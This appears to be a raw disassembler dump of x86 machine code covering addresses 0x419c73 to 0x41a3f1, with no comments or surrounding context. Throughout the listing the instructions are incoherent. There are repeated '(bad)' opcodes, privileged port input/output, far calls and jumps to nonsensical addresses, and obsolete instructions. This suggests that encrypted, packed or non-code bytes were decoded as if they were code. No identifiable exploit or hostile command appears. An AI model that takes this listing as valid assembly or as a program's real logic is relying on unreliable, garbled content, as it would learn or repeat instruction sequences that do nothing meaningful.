  419c73:	mov    esi,0x8f928091
  419c78:	es enter 0x4b1c,0xaf
  419c7d:	daa    
  419c7e:	xchg   esi,eax
  419c7f:	ins    DWORD PTR es:[edi],dx
  419c80:	test   al,0x33
  419c82:	addr16 out dx,eax
  419c84:	inc    esi
  419c85:	mov    edi,0x10514649
  419c8a:	sub    BYTE PTR [eax-0x7e],ch
  419c8d:	ret    
  419c8e:	sub    ebp,ecx
  419c90:	dec    esi
  419c91:	xchg   BYTE PTR [ebx+edi*8-0x55],al
  419c95:	dec    ebp
  419c96:	call   0x3d29f6c3
  419c9b:	shr    BYTE PTR [edi],1
  419c9d:	jbe    0x419c5a
  419c9f:	bound  ebp,QWORD PTR [ebx]
  419ca1:	xchg   edi,eax
  419ca2:	push   edx
  419ca3:	xchg   esi,eax
  419ca4:	cmp    bl,cl
  419ca6:	jae    0x419cf6
  419ca8:	mov    ebx,0x93b6f5e1
  419cad:	xor    BYTE PTR [ebp-0x34430068],bl
  419cb3:	dec    ecx
  419cb4:	mov    DWORD PTR [edx+0x28902cc1],ebp
  419cba:	mov    dh,0x34
  419cbc:	arpl   WORD PTR [eax+0x2f],si
  419cbf:	add    esi,DWORD PTR [ecx+0x13e385d7]
  419cc5:	cmp    ch,BYTE PTR [eax]
  419cc7:	or     esp,esp
  419cc9:	dec    eax
  419cca:	imul   esi,eax,0x33da27c3
  419cd0:	jmp    0x6f2391d9
  419cd5:	mov    al,0xd
  419cd7:	cmp    esp,DWORD PTR [edi-0x72]
  419cda:	and    al,0xac
  419cdc:	mov    dl,0xc4
  419cde:	into   
  419cdf:	cmp    BYTE PTR [esi-0x44],ah
  419ce2:	out    dx,al
  419ce3:	xchg   esp,eax
  419ce4:	out    dx,al
  419ce5:	mov    bl,0x63
  419ce7:	popf   
  419ce8:	and    eax,0x5a72a004
  419ced:	out    0x80,eax
  419cef:	jns    0x419ce5
  419cf1:	jb     0x419cd9
  419cf3:	frstpm(287 only) 
  419cf5:	sub    BYTE PTR [esi+0x15],bh
  419cf8:	add    al,0x4
  419cfa:	pop    edi
  419cfb:	(bad)  
  419cfc:	xor    eax,0x23722151
  419d01:	ds dec edi
  419d03:	test   al,0x38
  419d05:	jne    0x419d47
  419d07:	mov    ebx,0x47a2bfea
  419d0c:	idiv   DWORD PTR [esi-0x79]
  419d0f:	jae    0x419d46
  419d11:	jnp    0x419d0e
  419d13:	push   0x76
  419d15:	mov    bl,0x17
  419d17:	and    edx,0x3a
  419d1a:	test   BYTE PTR [ebp+0x25a8f77b],ah
  419d20:	mov    al,ds:0xea84fbe2
  419d25:	push   cs
  419d26:	and    BYTE PTR [edi-0x3],cl
  419d29:	add    BYTE PTR [ecx],dl
  419d2b:	dec    edx
  419d2c:	sub    al,0xc4
  419d2e:	cmp    bh,dh
  419d30:	xor    DWORD PTR [edx],edx
  419d32:	push   esi
  419d33:	mov    ch,0xd1
  419d35:	xchg   ebp,eax
  419d36:	adc    eax,0x4a0a929c
  419d3b:	(bad)  
  419d3c:	fnstsw WORD PTR [ebp-0x73]
  419d3f:	mov    ah,0x7d
  419d41:	lods   al,BYTE PTR ds:[esi]
  419d42:	into   
  419d43:	mov    ds:0xf4cff43,al
  419d48:	shr    BYTE PTR [edi],0xa3
  419d4b:	in     al,dx
  419d4c:	mov    ebx,0x5a1b3610
  419d51:	or     eax,0x3fda3714
  419d56:	iret   
  419d57:	scas   al,BYTE PTR es:[edi]
  419d58:	int3   
  419d59:	popf   
  419d5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d5b:	test   al,0x6f
  419d5d:	leave  
  419d5e:	pop    es
  419d5f:	sbb    ebx,DWORD PTR [esi+0x5a]
  419d62:	push   edi
  419d63:	push   es
  419d64:	pop    ebx
  419d65:	imul   BYTE PTR [ebp+0x3e]
  419d68:	call   0xf16e:0x50a55c9c
  419d6f:	imul   edx,DWORD PTR [esi+0x28d204d4],0xffffffca
  419d76:	pop    ebx
  419d77:	fadd   st,st(6)
  419d79:	cmp    al,0x72
  419d7b:	(bad)  
  419d7c:	mov    eax,0x748eec1b
  419d81:	in     al,dx
  419d82:	add    DWORD PTR [ebx-0x788a6ee9],edx
  419d88:	mov    bl,0xfe
  419d8a:	xlat   BYTE PTR ds:[ebx]
  419d8b:	jmp    0x419dcf
  419d8d:	jmp    0x419d56
  419d8f:	sti    
  419d90:	fwait
  419d91:	mov    BYTE PTR [eax+0x13],bh
  419d94:	ret    0xecd9
  419d97:	cmp    esi,DWORD PTR [ebx+0x3609a0a]
  419d9d:	outs   dx,DWORD PTR ds:[esi]
  419d9e:	sar    DWORD PTR [ecx+0x5e5dcb2d],1
  419da4:	xchg   ebp,eax
  419da5:	jno    0x419dae
  419da7:	pop    edx
  419da8:	mov    eax,ds:0x7fbf82e0
  419dad:	arpl   dx,si
  419daf:	addr16 xchg edi,eax
  419db1:	cld    
  419db2:	inc    edi
  419db3:	sub    BYTE PTR [eax+0x674711a6],dl
  419db9:	shl    DWORD PTR [ebx+0x3b0ca77f],0x7a
  419dc0:	scas   al,BYTE PTR es:[edi]
  419dc1:	daa    
  419dc2:	cmp    al,0xe8
  419dc4:	imul   ebp,DWORD PTR [ecx+0x532ba815],0x6f70bfd5
  419dce:	rol    DWORD PTR ds:0xeeb6f71d,0x7b
  419dd5:	sbb    DWORD PTR [eax+0x4ae7973d],edx
  419ddb:	popf   
  419ddc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ddd:	mov    al,ds:0x3445b451
  419de2:	outs   dx,DWORD PTR ds:[esi]
  419de3:	sti    
  419de4:	cmp    BYTE PTR [ecx+0x5c],al
  419de7:	daa    
  419de8:	sbb    eax,DWORD PTR [ebp+0x6441c8f2]
  419dee:	repz dec eax
  419df0:	push   edi
  419df1:	inc    edi
  419df2:	xchg   edi,eax
  419df3:	imul   esp,DWORD PTR [edx+ecx*1],0x1c
  419df7:	dec    esp
  419df8:	cdq    
  419df9:	mov    eax,ds:0x2e2e7e19
  419dfe:	not    DWORD PTR [ebx]
  419e00:	and    eax,0x4a8f59f0
  419e05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e06:	(bad)  
  419e08:	addr16 aas 
  419e0a:	aas    
  419e0b:	xlat   BYTE PTR ds:[ebx]
  419e0c:	pusha  
  419e0d:	xchg   edx,eax
  419e0e:	mov    eax,0xa0dd84c9
  419e13:	mov    ch,0xea
  419e15:	jmp    0x419db7
  419e17:	pop    esp
  419e18:	inc    edi
  419e19:	pop    edi
  419e1a:	inc    ebp
  419e1b:	lock fcomp QWORD PTR [ebx+0x73a5143a]
  419e22:	cmp    edi,DWORD PTR [edi-0x45]
  419e25:	mov    esi,0x75fd0678
  419e2a:	push   ds
  419e2b:	mov    esp,0xc1a2ea94
  419e30:	dec    edx
  419e31:	jl     0x419deb
  419e33:	popa   
  419e34:	call   0xbc99:0x390f712c
  419e3b:	mov    ebp,0x4d8c3eaa
  419e40:	ret    0x7d80
  419e43:	or     al,0x9a
  419e45:	mov    dh,0x60
  419e47:	cmp    eax,0xda3cfc67
  419e4c:	mov    eax,0x8e29e08f
  419e51:	lahf   
  419e52:	jno    0x419e2c
  419e54:	out    dx,eax
  419e55:	scas   eax,DWORD PTR es:[edi]
  419e56:	out    0x44,al
  419e58:	jle    0x419e40
  419e5a:	jnp    0x419e23
  419e5c:	mov    ah,0x34
  419e5e:	inc    ebp
  419e5f:	(bad)  
  419e60:	pop    ebp
  419e61:	push   esi
  419e62:	stos   BYTE PTR es:[edi],al
  419e63:	inc    esi
  419e64:	pop    eax
  419e65:	mov    dl,0x9a
  419e67:	mov    dl,0x29
  419e69:	pop    ebx
  419e6a:	cli    
  419e6b:	enter  0x326,0x79
  419e6f:	cmp    BYTE PTR ds:0x9e157e01,ch
  419e75:	mov    eax,fs
  419e77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e78:	push   eax
  419e79:	aam    0x31
  419e7b:	mov    ebp,DWORD PTR ds:0x299e43e4
  419e81:	push   ecx
  419e82:	or     eax,0xae33567e
  419e87:	cdq    
  419e88:	fst    QWORD PTR [ecx]
  419e8a:	xchg   ecx,eax
  419e8b:	stos   BYTE PTR es:[edi],al
  419e8c:	jo     0x419e96
  419e8e:	test   eax,0x6a41c131
  419e93:	fdivr  st(4),st
  419e95:	jmp    0x588a:0xb2ea9acf
  419e9c:	add    eax,edi
  419e9e:	cmc    
  419e9f:	or     bh,ah
  419ea1:	std    
  419ea2:	inc    edx
  419ea3:	mov    ebx,0x7fc7a7c2
  419ea8:	(bad)  
  419ea9:	mov    BYTE PTR [esi-0x4a5204e4],0x6d
  419eb0:	add    al,BYTE PTR [eax]
  419eb2:	pop    esi
  419eb3:	mov    ecx,0xaa44623
  419eb8:	repz stc 
  419eba:	xchg   al,ah
  419ebc:	or     esi,ebp
  419ebe:	pop    ebp
  419ebf:	fidiv  WORD PTR [eax+0x17507c99]
  419ec5:	push   0x2f416a9b
  419eca:	cs (bad) 
  419ecc:	ss js  0x419e8a
  419ecf:	dec    edi
  419ed0:	jnp    0x419edf
  419ed2:	xchg   edi,eax
  419ed3:	out    dx,eax
  419ed4:	fwait
  419ed5:	popa   
  419ed6:	ficom  DWORD PTR [edx]
  419ed8:	cld    
  419ed9:	(bad)  
  419edb:	loope  0x419ea2
  419edd:	sub    dh,ah
  419edf:	ret    
  419ee0:	push   es
  419ee1:	sub    al,BYTE PTR ds:0x293cee21
  419ee7:	jns    0x419ea0
  419ee9:	mov    esp,0x74961af
  419eee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419eef:	out    0x34,al
  419ef1:	test   BYTE PTR [esi-0x9],ch
  419ef4:	jae    0x419eda
  419ef6:	test   al,0xb4
  419ef8:	sub    al,0x28
  419efa:	inc    eax
  419efb:	cmp    esi,DWORD PTR [ecx+0x3875a9ed]
  419f01:	mov    ?,WORD PTR [ecx+eax*1-0x7e5334de]
  419f08:	stc    
  419f09:	sub    DWORD PTR [ebx+0x2b182f41],esp
  419f0f:	xchg   edi,eax
  419f10:	outs   dx,DWORD PTR ds:[esi]
  419f11:	jbe    0x419f76
  419f13:	inc    ebx
  419f14:	adc    DWORD PTR [edx-0x71],edx
  419f17:	pop    es
  419f18:	ja     0x419f05
  419f1a:	mov    eax,ds:0xc82afea4
  419f1f:	mov    ah,0x58
  419f21:	inc    edi
  419f22:	dec    esi
  419f23:	jmp    0x66109c37
  419f28:	repnz mov ebp,0x380edf32
  419f2e:	pop    edi
  419f2f:	out    0x8e,eax
  419f31:	stos   DWORD PTR es:[edi],eax
  419f32:	in     al,dx
  419f33:	and    esp,DWORD PTR [edi]
  419f35:	cwde   
  419f36:	dec    edi
  419f37:	clc    
  419f38:	imul   ecx,DWORD PTR [edi+0x1],0xffffff8a
  419f3c:	call   0x7e7578dd
  419f41:	inc    esp
  419f42:	popf   
  419f43:	popf   
  419f44:	stc    
  419f45:	(bad)  
  419f47:	jl     0x419f18
  419f49:	jecxz  0x419fc3
  419f4b:	jg     0x419efc
  419f4d:	dec    ebx
  419f4e:	sbb    al,0xfa
  419f50:	aaa    
  419f51:	pop    ds
  419f52:	and    DWORD PTR [ebx-0x4c],eax
  419f55:	test   DWORD PTR [esi],edx
  419f57:	push   ecx
  419f58:	data16 mov ds:0xfd3572f1,al
  419f5e:	ja     0x419f61
  419f60:	cmp    BYTE PTR [edx],cl
  419f62:	je     0x419f1a
  419f64:	adc    ebp,DWORD PTR [esi+eiz*2-0x9c75830]
  419f6b:	and    bh,BYTE PTR gs:[ebx+0xc0d0271]
  419f72:	retf   0x2935
  419f75:	jecxz  0x419f51
  419f77:	in     eax,dx
  419f78:	sub    BYTE PTR [eax+0x3f340827],0xf2
  419f7f:	out    dx,eax
  419f80:	ret    
  419f81:	mov    al,0x80
  419f83:	ret    
  419f84:	push   es
  419f85:	fst    DWORD PTR [edi-0x64]
  419f88:	adc    ch,dh
  419f8a:	dec    edx
  419f8b:	inc    ebx
  419f8c:	shr    BYTE PTR [esi+0x18827418],1
  419f92:	jecxz  0x419f73
  419f94:	(bad)  
  419f95:	jbe    0x419f88
  419f97:	inc    ecx
  419f98:	cmp    eax,0x16648bc8
  419f9d:	add    edx,DWORD PTR [ebx]
  419f9f:	mov    eax,ds:0x3a2ca23e
  419fa4:	push   ss
  419fa5:	data16 adc al,0x5d
  419fa8:	jne    0x41a00c
  419faa:	or     DWORD PTR [ebx],ebx
  419fac:	sahf   
  419fad:	mov    al,ds:0x5f0af6c6
  419fb2:	mov    edi,0xdacc74ab
  419fb7:	xchg   DWORD PTR [ebx+0x6818db67],edx
  419fbd:	ins    DWORD PTR es:[edi],dx
  419fbe:	inc    eax
  419fbf:	ins    BYTE PTR es:[edi],dx
  419fc0:	daa    
  419fc1:	loop   0x41a012
  419fc3:	mov    ebx,0xcaf7d23e
  419fc8:	xor    dl,BYTE PTR [eax]
  419fca:	ins    DWORD PTR es:[edi],dx
  419fcb:	sub    DWORD PTR [edx+0x2a4f7e33],ecx
  419fd1:	jg     0x419fb0
  419fd3:	sbb    DWORD PTR [edx+0x6],0x64
  419fd7:	(bad)  
  419fd8:	push   0x3f
  419fda:	or     edx,esi
  419fdc:	popf   
  419fdd:	aas    
  419fde:	jmp    0x419fba
  419fe0:	mov    ds:0x9441b3d9,eax
  419fe5:	mov    al,0x79
  419fe7:	test   DWORD PTR [ecx+0x4],eax
  419fea:	jl     0x419f85
  419fec:	jno    0x419ff6
  419fee:	xor    DWORD PTR [edx],ebp
  419ff0:	in     eax,0xd0
  419ff2:	push   ebp
  419ff3:	shl    BYTE PTR [esi+0x2e],1
  419ff6:	mov    ebp,0xc400de67
  419ffb:	xchg   DWORD PTR [ebx+0x62],esi
  419ffe:	js     0x419f81
  41a000:	test   al,0xac
  41a002:	xchg   edi,eax
  41a003:	pop    edi
  41a004:	lds    edi,FWORD PTR [ecx+0x5b37c1c9]
  41a00a:	mov    eax,0x32f36814
  41a00f:	jg     0x41a05e
  41a011:	mov    dl,0x46
  41a013:	jp     0x41a05d
  41a015:	sbb    BYTE PTR [ecx-0x212864c3],ch
  41a01b:	test   al,0x5
  41a01d:	outs   dx,DWORD PTR ds:[esi]
  41a01e:	sub    BYTE PTR [ebp-0x10],ch
  41a021:	es jno 0x41a08a
  41a024:	cs mov ebp,0x6d7df2b1
  41a02a:	sbb    eax,0x2dc8dc35
  41a02f:	jbe    0x419fe8
  41a031:	jecxz  0x419fb7
  41a033:	sahf   
  41a034:	and    eax,0x2da10ca
  41a039:	inc    eax
  41a03a:	xchg   BYTE PTR [edx],ch
  41a03c:	out    dx,al
  41a03d:	std    
  41a03e:	repnz bound edi,QWORD PTR [ecx+0x1b242776]
  41a045:	sub    ebx,DWORD PTR [eax]
  41a047:	add    DWORD PTR [edi+0x40],ebx
  41a04a:	add    ah,al
  41a04c:	sub    bh,BYTE PTR [esi]
  41a04e:	sub    DWORD PTR [esi+ebp*1],0x788dec3b
  41a055:	dec    eax
  41a056:	cli    
  41a057:	scas   al,BYTE PTR es:[edi]
  41a058:	xlat   BYTE PTR ds:[ebx]
  41a059:	cmp    dl,BYTE PTR [eax]
  41a05b:	mov    esp,0xd1d5d097
  41a060:	push   esi
  41a061:	jnp    0x41a059
  41a063:	imul   ecx,DWORD PTR [edi],0xffffff8c
  41a066:	retf   
  41a067:	(bad)  
  41a068:	jns    0x41a0b8
  41a06a:	out    dx,eax
  41a06b:	xor    eax,0x65133bcd
  41a070:	das    
  41a071:	inc    edx
  41a072:	popf   
  41a073:	dec    edi
  41a074:	or     BYTE PTR [ebp-0xb],0xe4
  41a078:	push   ebx
  41a079:	(bad)  
  41a07a:	sbb    dh,BYTE PTR [edi-0x23ae1158]
  41a080:	sbb    dh,BYTE PTR [esi+edi*8-0x43]
  41a084:	xor    al,0xad
  41a086:	hlt    
  41a087:	jno    0x41a043
  41a089:	lea    edx,ss:[edi-0x2d3c29c1]
  41a090:	mov    ch,BYTE PTR [edi+eiz*2+0x4de87ad2]
  41a097:	push   esp
  41a098:	popf   
  41a099:	sbb    BYTE PTR [ecx-0x3a],al
  41a09c:	ins    DWORD PTR es:[edi],dx
  41a09d:	mov    edi,0x93e21033
  41a0a2:	pop    DWORD PTR [ebp+esi*2+0x1c87944d]
  41a0a9:	mov    ds:0x2c9533d9,eax
  41a0ae:	cmp    bl,dl
  41a0b0:	lock pop ecx
  41a0b2:	adc    eax,0x88601608
  41a0b7:	mov    esp,0x3b6bc925
  41a0bc:	fsub   DWORD PTR [ebp-0x4c04768c]
  41a0c2:	add    eax,0xd8c4d2f0
  41a0c7:	pop    ds
  41a0c8:	dec    esp
  41a0c9:	out    dx,al
  41a0ca:	mov    eax,0x917429f0
  41a0cf:	dec    ebx
  41a0d0:	iret   
  41a0d1:	sar    DWORD PTR ds:0x7ad9d8e0,0xb2
  41a0d8:	fimul  DWORD PTR ds:0xa58ecb9a
  41a0de:	mov    bl,0x58
  41a0e0:	inc    edi
  41a0e1:	cmp    al,bl
  41a0e3:	js     0x41a0d8
  41a0e5:	xor    BYTE PTR [eax+0x64],cl
  41a0e8:	push   ebp
  41a0e9:	push   0x596f1f6f
  41a0ee:	add    DWORD PTR [edx+0x15],0x63
  41a0f2:	sbb    BYTE PTR [esi],cl
  41a0f4:	mov    WORD PTR ds:[edx],ds
  41a0f7:	scas   al,BYTE PTR es:[edi]
  41a0f8:	adc    DWORD PTR [ebx-0x31df9ef8],esi
  41a0fe:	mov    eax,ds:0xfbcd742
  41a103:	push   0xc1fd9503
  41a108:	out    0x1d,al
  41a10a:	out    dx,al
  41a10b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a10c:	pop    DWORD PTR [ecx+0x75e55ea2]
  41a112:	ror    BYTE PTR [ebx+0x1702b6],1
  41a118:	push   edi
  41a119:	(bad)  
  41a11b:	add    esp,DWORD PTR [bx+di-0x27]
  41a11f:	pop    ecx
  41a120:	(bad)  
  41a121:	sub    DWORD PTR ds:0xc6006ba7,ebp
  41a127:	shl    DWORD PTR ds:0x382582e,0xfe
  41a12e:	sbb    ah,BYTE PTR [eax+0x7b2c790a]
  41a134:	cdq    
  41a135:	sub    bh,cl
  41a137:	inc    edx
  41a138:	jmp    0xc737a977
  41a13d:	jbe    0x41a0dd
  41a13f:	fst    DWORD PTR [ebx+edx*8+0x3c17c29]
  41a146:	in     eax,dx
  41a147:	jne    0x41a1bf
  41a149:	jne    0x41a181
  41a14b:	aaa    
  41a14c:	xchg   BYTE PTR ds:0xa265fcab,ah
  41a152:	out    dx,al
  41a153:	mov    bh,BYTE PTR [ecx]
  41a155:	iret   
  41a156:	int    0x7e
  41a158:	out    dx,al
  41a159:	mov    bh,0x31
  41a15b:	outs   dx,DWORD PTR ds:[esi]
  41a15c:	sbb    cl,BYTE PTR [esi+0xa]
  41a15f:	push   esi
  41a160:	(bad)  
  41a161:	xor    DWORD PTR cs:0x4a3675a3,edx
  41a168:	popa   
  41a169:	xchg   ebx,eax
  41a16a:	scas   eax,DWORD PTR es:[edi]
  41a16b:	call   0xdaf9:0x55c450fb
  41a172:	sbb    al,BYTE PTR [esi]
  41a174:	mov    esp,0xecd854e1
  41a179:	int3   
  41a17a:	jb     0x41a104
  41a17c:	jp     0x41a15d
  41a17e:	fimul  DWORD PTR [ebx-0x42]
  41a181:	mov    dl,0xc9
  41a183:	dec    ebp
  41a184:	(bad)
  41a188:	push   edx
  41a189:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a18a:	ins    DWORD PTR es:[edi],dx
  41a18b:	ds int3 
  41a18d:	mov    esp,0x804c5b01
  41a192:	clc    
  41a193:	jl     0x41a15a
  41a195:	add    DWORD PTR [esi+0x46],ebp
  41a198:	inc    eax
  41a199:	pop    ecx
  41a19a:	aas    
  41a19b:	xchg   esp,eax
  41a19c:	mov    esp,0x2cc98320
  41a1a1:	fnstenv [eax-0x6b18301c]
  41a1a7:	jg     0x41a223
  41a1a9:	ja     0x41a16f
  41a1ab:	xor    al,0xc6
  41a1ad:	mov    esi,0x579e9699
  41a1b2:	adc    DWORD PTR [edi],eax
  41a1b4:	pop    ebp
  41a1b5:	sahf   
  41a1b6:	scas   al,BYTE PTR es:[edi]
  41a1b7:	daa    
  41a1b8:	mov    al,0x1a
  41a1ba:	xchg   edx,eax
  41a1bb:	add    DWORD PTR [edx],ebx
  41a1bd:	addr16 sahf 
  41a1bf:	scas   eax,DWORD PTR es:[edi]
  41a1c0:	mov    dh,0xa9
  41a1c2:	pop    esi
  41a1c3:	push   ds
  41a1c4:	jge    0x41a199
  41a1c6:	adc    cl,dh
  41a1c8:	(bad)  
  41a1c9:	push   cs
  41a1ca:	packuswb mm1,QWORD PTR [edi+0x72a05fb9]
  41a1d1:	xchg   ebp,eax
  41a1d2:	hlt    
  41a1d3:	cmp    al,0x22
  41a1d5:	iret   
  41a1d6:	push   ss
  41a1d7:	shl    BYTE PTR [edx+0x18],1
  41a1da:	outs   dx,BYTE PTR ds:[esi]
  41a1db:	push   esp
  41a1dc:	push   edi
  41a1dd:	iret   
  41a1de:	cmp    al,ch
  41a1e0:	sub    eax,0x2b1fae62
  41a1e5:	pop    ecx
  41a1e6:	xchg   ecx,eax
  41a1e7:	out    dx,al
  41a1e8:	cmp    ah,bl
  41a1ea:	addr16 dec esi
  41a1ec:	sbb    dl,dl
  41a1ee:	inc    ebx
  41a1ef:	aas    
  41a1f0:	mov    esi,0xe69ea34e
  41a1f5:	pop    es
  41a1f6:	fstp   DWORD PTR [esi-0x5ad80349]
  41a1fc:	js     0x41a1cf
  41a1fe:	inc    DWORD PTR [edi]
  41a200:	jl     0x41a1fc
  41a202:	mov    ch,0x8b
  41a204:	mov    ebp,0x627cac60
  41a209:	or     esi,DWORD PTR [ebx]
  41a20b:	shl    ebx,0xe5
  41a20e:	out    0x9f,al
  41a210:	push   ebx
  41a211:	fnstsw WORD PTR [esi+0x1a]
  41a214:	or     eax,0x36ec099c
  41a219:	nop
  41a21a:	cmp    ebp,ecx
  41a21c:	sub    BYTE PTR [eax],0x5b
  41a21f:	fmul   QWORD PTR cs:[eax+0x6a58f21d]
  41a226:	adc    DWORD PTR [ebx+0x8],edx
  41a229:	cld    
  41a22a:	pop    ecx
  41a22b:	fdiv   QWORD PTR [eax+0x46]
  41a22e:	ret    
  41a22f:	push   ds
  41a230:	push   ecx
  41a231:	lods   al,BYTE PTR ds:[esi]
  41a232:	pop    edx
  41a233:	test   BYTE PTR [ecx+ebx*2],dl
  41a236:	fdivr  DWORD PTR [esi+0x47]
  41a239:	(bad)  [esi-0x5f]
  41a23c:	inc    esp
  41a23d:	cli    
  41a23e:	jge    0x41a2bc
  41a240:	and    eax,DWORD PTR [esi]
  41a242:	mov    ecx,0x8d64629f
  41a247:	std    
  41a248:	push   esp
  41a249:	cmp    eax,0x3c70981f
  41a24e:	sbb    BYTE PTR [edi-0x24],al
  41a251:	mov    BYTE PTR [eax+0x67],dh
  41a254:	sub    al,0x68
  41a256:	clc    
  41a257:	sbb    eax,esp
  41a259:	fiadd  DWORD PTR [esp+edi*8+0x6]
  41a25d:	mov    WORD PTR [edx],fs
  41a25f:	pop    edi
  41a260:	push   0x2b
  41a262:	in     al,0x1e
  41a264:	and    DWORD PTR [ecx+0x60],ebx
  41a267:	xor    BYTE PTR [ecx+0x7b],al
  41a26a:	cmc    
  41a26b:	mov    ecx,0xecac7c88
  41a270:	inc    esp
  41a271:	xor    DWORD PTR [eax+0x77],ecx
  41a274:	sub    cl,dh
  41a276:	retf   0x9505
  41a279:	dec    ebx
  41a27a:	pop    edx
  41a27b:	inc    edi
  41a27c:	xchg   edi,eax
  41a27d:	xchg   ebx,eax
  41a27e:	push   0x36
  41a280:	cmp    al,0xf
  41a282:	mov    cl,0xf1
  41a284:	mov    bl,0xc1
  41a286:	mov    al,ds:0xd9c3cb7c
  41a28b:	pop    edx
  41a28c:	jg     0x41a245
  41a28e:	stc    
  41a28f:	mov    cl,bl
  41a291:	fucomp st(5)
  41a293:	test   eax,0x2c664ef7
  41a298:	push   ss
  41a299:	jbe    0x41a2c0
  41a29b:	or     ecx,ecx
  41a29d:	es and al,0x4c
  41a2a0:	retf   0xb665
  41a2a3:	dec    edi
  41a2a4:	mov    esi,0x44eb7fc9
  41a2a9:	sti    
  41a2aa:	inc    ebp
  41a2ab:	out    dx,eax
  41a2ac:	mov    dl,0x7b
  41a2ae:	jnp    0x41a24f
  41a2b0:	repz imul esi,DWORD PTR [ebp+0x1cf6640a],0xffffffb2
  41a2b8:	into   
  41a2b9:	daa    
  41a2ba:	loopne 0x41a27c
  41a2bc:	popa   
  41a2bd:	push   0x8ae957b
  41a2c2:	loope  0x41a2da
  41a2c4:	pop    ebp
  41a2c5:	repnz pop ds
  41a2c7:	das    
  41a2c8:	pop    ds
  41a2c9:	push   edi
  41a2ca:	mov    ah,0xc6
  41a2cc:	push   ss
  41a2cd:	mov    dl,0x10
  41a2cf:	outs   dx,BYTE PTR ds:[esi]
  41a2d0:	imul   ebp,esp,0xe7ab4726
  41a2d6:	mov    eax,DWORD PTR [edi-0x69]
  41a2d9:	inc    edx
  41a2da:	sub    al,0xdb
  41a2dc:	int    0x2e
  41a2de:	inc    eax
  41a2df:	scas   eax,DWORD PTR es:[edi]
  41a2e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2e1:	jnp    0x41a26d
  41a2e3:	adc    DWORD PTR [ecx],ebx
  41a2e5:	outs   dx,BYTE PTR ds:[esi]
  41a2e6:	mov    ebp,edx
  41a2e8:	icebp  
  41a2e9:	outs   dx,DWORD PTR ds:[esi]
  41a2ea:	mov    ebp,0x559d6c92
  41a2ef:	xlat   BYTE PTR ds:[ebx]
  41a2f0:	pop    ebx
  41a2f1:	pop    esi
  41a2f2:	fadd   st,st(6)
  41a2f4:	pushw  ds
  41a2f6:	jne    0x41a331
  41a2f8:	push   edi
  41a2f9:	sti    
  41a2fa:	mov    dh,0x9d
  41a2fc:	(bad)  
  41a2fd:	jno    0x41a305
  41a2ff:	cmp    DWORD PTR [esp+eiz*8+0x14],eax
  41a303:	div    DWORD PTR [eax-0x2a]
  41a306:	or     edx,DWORD PTR [eax-0x45]
  41a309:	jecxz  0x41a2ac
  41a30b:	pop    esi
  41a30c:	sbb    al,0x71
  41a30e:	pop    ecx
  41a30f:	rol    DWORD PTR [edx-0x78],cl
  41a312:	int3   
  41a313:	inc    edx
  41a314:	pushf  
  41a315:	mov    edi,0x861aa4d3
  41a31a:	in     eax,0x2e
  41a31c:	xor    al,0xe9
  41a31e:	mov    bl,0x57
  41a320:	push   0xffffffbd
  41a322:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a323:	nop
  41a324:	pop    esp
  41a325:	int    0x32
  41a327:	enter  0xd473,0x70
  41a32b:	hlt    
  41a32c:	adc    eax,0x16490247
  41a331:	or     edx,esp
  41a333:	ret    
  41a334:	lods   al,BYTE PTR ds:[esi]
  41a335:	cdq    
  41a336:	inc    edx
  41a337:	lods   eax,DWORD PTR ds:[esi]
  41a338:	jns    0x41a388
  41a33a:	mov    DWORD PTR [esi],edi
  41a33c:	and    cl,BYTE PTR [eax-0x32849a70]
  41a342:	js     0x41a341
  41a344:	jae    0x41a39f
  41a346:	test   eax,0x1dcda1e6
  41a34b:	sub    ebp,ebx
  41a34d:	aaa    
  41a34e:	nop
  41a34f:	aad    0x3e
  41a351:	mov    ds:0xe9fd896c,eax
  41a356:	retf   0x786a
  41a359:	mov    ebx,DWORD PTR [eax-0x25c868b2]
  41a35f:	jne    0x41a3a8
  41a361:	jl     0x41a3ae
  41a363:	mov    WORD PTR [esi+0xa],cs
  41a366:	jge    0x41a3de
  41a368:	fimul  DWORD PTR [esi-0x37122b99]
  41a36e:	xchg   esi,eax
  41a36f:	test   DWORD PTR [eax-0x4503a704],eax
  41a375:	shl    DWORD PTR [esi+0x74],cl
  41a378:	jmp    0x991b01d6
  41a37d:	xor    DWORD PTR [ebp-0x25c01f7c],0xffffffd3
  41a384:	js     0x41a376
  41a386:	or     eax,0x6cb8cb47
  41a38b:	sub    eax,0x86064183
  41a390:	ins    DWORD PTR es:[edi],dx
  41a391:	ins    DWORD PTR es:[edi],dx
  41a392:	sub    esi,DWORD PTR [ecx-0x27]
  41a395:	(bad)  
  41a396:	mov    ds:0x589c3389,al
  41a39b:	imul   eax,DWORD PTR [edx],0xc044dceb
  41a3a1:	mov    WORD PTR [ebx],?
  41a3a3:	sbb    ah,BYTE PTR [ecx+0x7912ce83]
  41a3a9:	cmp    edi,ecx
  41a3ab:	push   cs
  41a3ac:	in     eax,dx
  41a3ad:	iret   
  41a3ae:	xchg   ebx,eax
  41a3af:	and    DWORD PTR [eax],ecx
  41a3b1:	cmp    DWORD PTR [edi+0x2e53f83f],edx
  41a3b7:	inc    ebx
  41a3b8:	jae    0x41a34c
  41a3ba:	pop    esi
  41a3bb:	mov    ah,BYTE PTR [ebx+0x49]
  41a3be:	and    bl,al
  41a3c0:	retf   0xe973
  41a3c3:	repnz test BYTE PTR [edx],bl
  41a3c6:	sub    eax,0xb2c7e845
  41a3cb:	and    ah,bl
  41a3cd:	aaa    
  41a3ce:	cmp    ebp,0xffffffcb
  41a3d1:	int    0x7d
  41a3d3:	lds    ebp,FWORD PTR [esi]
  41a3d5:	fisub  DWORD PTR [ecx+eiz*8+0x68e81bd5]
  41a3dc:	xchg   esi,eax
  41a3dd:	(bad)  [esi]
  41a3df:	inc    esp
  41a3e0:	dec    edi
  41a3e1:	shl    eax,0xbd
  41a3e4:	add    al,0x52
  41a3e6:	cmp    eax,0x3c8c576b
  41a3eb:	cmp    dh,BYTE PTR [ebp-0x5329312b]
  41a3f1:	or     BYTE PTR [ecx+0x54],al
